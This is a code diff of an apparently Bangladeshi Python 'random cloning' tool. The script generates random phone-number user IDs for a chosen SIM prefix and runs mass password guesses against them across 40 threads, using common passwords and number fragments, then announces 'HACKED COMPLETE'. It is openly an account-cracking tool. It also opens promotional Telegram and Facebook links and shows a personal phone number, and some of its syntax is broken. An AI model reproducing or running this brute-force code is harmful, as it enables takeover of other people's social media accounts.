@@ -89,78 +89,87 @@ for ua in range(10000):
 	h='Mobile Safari/537.36'
 	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
 	ugen.append(alhhaj)
-import os
-import sys
-import time
-import random
-import shutil
+os.system("xdg-open https://t.me/JAVA_SCIPT_KING")
+logo =("""                        \033[1;31m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 ♚
+██╗    ██╗ █████╗  ██████╗██╗ ██████╗ 
+██║    ██║██╔══██╗██╔════╝██║██╔═══██╗
+██║ █╗ ██║███████║██║     ██║██║   ██║
+██║███╗██║██╔══██║██║     ██║██║   ██║
+╚███╔███╔╝██║  ██║╚██████╗██║╚██████╔╝
+ ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝
+                                                                                                              
+print("\033[1;31m     ┏━━━━━━━━━━━━━━━━━━━\033[1;32m BCS \033[1;31m━━━━━━━━━━━━━━━━━━━━━┓")
+print("\033[1;31m     ┃ \033[1;35m❣︎☔︎ \033[1;36m𝙉𝘼𝙈𝙀         \033[1;31m: \033[1;33m[★] JABER\033[1;31m                ┃")
+print("\033[1;31m     ┃ \033[1;35m❣︎☔︎ \033[1;36m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆     \033[1;31m: \033[1;33m[★] JABER x JABER ARMY\033[1;31m    ┃")
+print("\033[1;31m     ┃ \033[1;35m❣︎☔︎ \033[1;36m𝙂𝙄𝙏𝙃𝙐𝘽       \033[1;31m: \033[1;33m[★] J x T ARMY\033[1;31m            ┃")
+print("\033[1;31m     ┃ \033[1;35m❣︎☔︎ \033[1;36m𝙍𝙀𝙇𝙄𝙂𝙄𝙊𝙉     \033[1;31m: \033[1;33m[★] BANGLADESHI\033[1;31m           ┃")
+print("\033[1;31m     ┃ \033[1;35m❣︎☔︎ \033[1;36m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋     \033[1;31m: \033[1;33m[★] +8801852192547\033[1;31m       ┃")
+print("\033[1;31m     ┃ \033[1;35m❣︎☔︎ \033[1;36m𝙏𝙊𝙊𝙇 𝙉𝘼𝙈𝙀   \033[1;31m: \033[1;33m[★] R4NDOM-CLONING\033[1;31m       ┃")
+print("\033[1;31m     ┃ \033[1;35m❣︎☔︎ \033[1;36m𝙏𝙊𝙊𝙇 𝙎𝙏𝘼𝙏𝙐𝙎 \033[1;31m: \033[1;33m[★] Free\033[1;31m                ┃") 
+ print("\033[1;31m     ┗━━━━━━━━━━━━━━━━━━━\033[1;34m TEAM \033[1;31m━━━━━━━━━━━━━━━━━━━━┛\033[0m")
 
-# رنګونه
-R = "\033[1;31m"  # سور
-G = "\033[1;32m"  # شین
-Y = "\033[1;33m"  # ژیړ
-B = "\033[1;34m"  # آبي
-M = "\033[1;35m"  # بنفشي
-C = "\033[1;36m"  # فیروزه‌یي
-W = "\033[1;37m"  # سپین
-RESET = "\033[0m"
-
-# تالندي (Lightning) افکت
-def lightning_effect(duration=3, width=60):
-    chars = [' ', '.', '*', '^', '⚡', '•', ' ']
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        line = ''.join(random.choice(chars) for _ in range(width))
-        sys.stdout.write('\r' + random.choice([Y, C, W, B]) + line + RESET)
-        sys.stdout.flush()
-        time.sleep(0.05)
-        sys.stdout.write('\r' + ' ' * width + '\r')
-        sys.stdout.flush()
-
-# ASCII لوگو
-def show_logo():
-    logo_art = [
-        f"{Y}██╗    ██╗ █████╗  ██████╗██╗ ██████╗   ",
-        f"{Y}██║    ██║██╔══██╗██╔════╝██║██╔═══██╗  ",
-        f"{Y}██║ █╗ ██║███████║██║     ██║██║   ██║  ",
-        f"{Y}██║███╗██║██╔══██║██║     ██║██║   ██║  ",
-        f"{Y}╚███╔███╔╝██║  ██║╚██████╗██║╚██████╔╝  ",
-        f"{Y} ╚══╝╚══╝ ╚═╝  ╚═╝ ╚═════╝╚═╝ ╚═════╝   {RESET}"
-    ]
-    cols = shutil.get_terminal_size().columns
-    for line in logo_art:
-        print(line.center(cols))
-        time.sleep(0.05)
-
-    # ځلا افکت
-    for _ in range(3):
-        print(f"{B}{'⚡ WACIQ ⚡'.center(cols)}{RESET}")
-        time.sleep(0.3)
-        print(" ".center(cols))
-        time.sleep(0.3)
-
-# ښکلی معلوماتي بکس
-def show_info_box():
-    box = f"""
-{R}┏━━━━━━━━━━━━━━━━━━━{G}TEAM WACIQ{R}━━━━━━━━━━━━━━━━━━━━┓
-{R}┃{W} 🧠 NAME         : {C}JABER                                 {R}┃
-{R}┃{W} 🌐 FACEBOOK     : {C}JABER x JABER ARMY                    {R}┃
-{R}┃{W} 💻 GITHUB       : {C}JxT-ARMY                              {R}┃
-{R}┃{W} 🌍 RELIGION     : {C}BANGLADESHI                           {R}┃
-{R}┃{W} 📱 WHATSAPP     : {C}+8801852192547                        {R}┃
-{R}┃{W} 🧩 TOOL NAME    : {C}R4NDOM-CLONING                        {R}┃
-{R}┃{W} 🔓 TOOL STATUS  : {G}FREE                                  {R}┃
-{R}┗━━━━━━━━━━━━━━━━━━━{M}⚡ POWERED BY WACIQ ⚡{R}━━━━━━━━━━━━━━┛{RESET}
-"""
-    print(box)
-
-# اصلي اجرای کود
-if __name__ == "__main__":
+def Jaber():
     os.system('clear')
-    lightning_effect(duration=3, width=70)
-    show_logo()
-    show_info_box()
-    print(f"\n{C}✨ Welcome to the Future of WACIQ Tools ✨{RESET}\n") 
+    os.system('xdg-open https://facebook.com/groups/544684501030088/')
+    print(logo)
+    print("")
+    print("\033[1;96m ╔═════════════════════════════════╗")
+    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ        \033[1;36m║")
+    print("\033[1;96m ╠═════════════════════════════════╣")
+    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       \033[1;36m║")
+    print(" \033[1;36m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ MS ᏀᎡϴႮᏢ       \033[1;36m║")
+    print("\033[1;36m ║  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m ᎬХᏆͲ                   \033[1;36m║")
+    print("\033[1;96m ╚═════════════════════════════════╝")
+    print("")
+    Jaber = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
+    if Jaber in ["1","A"]:
+        Jabers()
+    if Jaber in ["2","B"]:
+        os.system('xdg-open https://facebook.com/groups/544684501030088/')
+    if Jaber in ["3","C"]:
+        os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
+    if Jaber in ["0","X"]:
+        os.system('exit')
+
+def Jabers():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print("\033[1;91m╔════════════════════════════════════════════╗")
+    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ║")
+    print("\033[1;91m╚════════════════════════════════════════════╝")
+    code = input('\033[1;32m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ :\033[1;36m ')
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
+    print(logo)
+    print("\033[1;91m╔════════════════════════════════════════════╗")
+    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m ║")
+    print("\033[1;91m╚════════════════════════════════════════════╝")
+    limit=int(input("\033[1;32m ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :\033[1;36m "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;91m╔═════════════════════════════════════╗")
+        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : '+code) 
+        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ͲϴͲᎪᏞ ᏆᎠ : '+tl)
+        print(f'\033[1;91m║\033[1;92m MACK BY JABER x TANJID ')
+        print("\033[1;91m╚═════════════════════════════════════╝")
+        for love in user:
+            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
+            uid = code+love
+            Fb_crack.submit(Jaberm,uid,pwx,tl)
+    print("\033[1;91m╔═══════════════════════════╗")
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM JABER ')
+    print("\033[1;91m╚═══════════════════════════╝")
+
+
 def Jaberm(uid,pwx,tl):
     global loop
     global cps
@@ -226,4 +235,4 @@ def Jaberm(uid,pwx,tl):
     except:
         pass
  
-Jaber()
+Jaber() 
